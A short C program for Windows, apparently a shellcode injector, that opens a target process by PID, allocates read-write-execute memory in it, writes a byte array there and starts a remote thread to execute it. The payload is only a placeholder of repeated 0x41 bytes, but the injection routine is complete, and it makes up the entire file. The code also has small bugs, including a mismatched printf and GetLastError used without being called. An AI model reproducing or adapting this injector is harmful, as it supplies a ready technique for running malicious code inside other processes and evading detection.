#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[+]";
const char* e = "[+]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
unsigned char expertSC[] = "\x41\x41\x41\x41\x41\x41";


int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process %ld\n", i, PID);
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);
	printf("got a handle to the process! \n\\---0x%p\n", k, hProcess);
	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process %ld, error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(expertSC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu_bytes with rwx permissions", k, sizeof(expertSC));
	WriteProcessMemory(hProcess, rBuffer, expertSC, sizeof(expertSC), NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(expertSC));
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0,(LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread error: %ld", e, GetLastError);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread %ld \n\\---0x%p\n", k, TID, hThread);
	printf("waiting for thread to finish\n");
	WaitForSingleObject(hThread, INFINITE);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished! see you next time :>\n", k);

	return EXIT_SUCCESS;
}